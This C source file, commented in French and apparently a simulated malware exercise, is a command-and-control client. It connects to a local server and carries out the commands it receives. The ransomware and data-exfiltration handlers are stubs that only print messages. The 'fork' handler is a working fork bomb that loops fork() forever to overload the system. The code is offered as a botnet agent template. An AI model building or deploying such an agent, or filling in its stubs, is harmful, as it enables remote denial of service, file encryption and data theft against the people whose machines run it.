#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define SERVER_IP "127.0.0.1"
#define PORT 12345

// Fonction pour chiffrer un fichier (simulation ransomware)
void encrypt_files() {
    printf("Encrypting files with ransomware...\n");
    // Implémentez la logique pour chiffrer les fichiers ici
    // Par exemple, renommer les fichiers et ajouter la signature.
}

// Fonction pour simuler l'exfiltration de fichiers
void exfiltrate_data() {
    printf("Exfiltrating data...\n");
    // Implémentez la logique pour exfiltrer les fichiers ici
    // Par exemple, envoyer le contenu d'un fichier au serveur.
}

// Fonction pour simuler l'exécution d'un fork
void handle_fork() {
    printf("Handling fork...\n");
    while (1) {
        fork();  // Crée un fork pour surcharger le système
    }
}

int main() {
    int sock = 0;
    struct sockaddr_in serv_addr;
    char client_id[50];
    char buffer[1024] = {0};

    // Crée le socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Socket creation failed");
        return -1;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    // Convertir l'adresse IP
    if (inet_pton(AF_INET, SERVER_IP, &serv_addr.sin_addr) <= 0) {
        perror("Invalid address");
        return -1;
    }

    // Connexion au serveur
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("Connection failed");
        return -1;
    }

    // Envoie de l'identifiant au serveur
    printf("Enter your client ID: ");
    fgets(client_id, sizeof(client_id), stdin);
    client_id[strcspn(client_id, "\n")] = '\0';  // Supprime le '\n' à la fin
    send(sock, client_id, strlen(client_id), 0);

    while (1) {
        // Lecture de l'ordre du serveur
        read(sock, buffer, sizeof(buffer));
        printf("Received command: %s\n", buffer);
 
        if (strcmp(buffer, "ransomware") == 0) {
            encrypt_files();
        } else if (strcmp(buffer, "exfiltration") == 0) {
            exfiltrate_data();
        } else if (strcmp(buffer, "fork") == 0) {
            handle_fork();
        } else if (strcmp(buffer, "out") == 0) {
            printf("Disconnected from server.\n");
            break;
        }
    }
 
    close(sock);
    return 0;
}
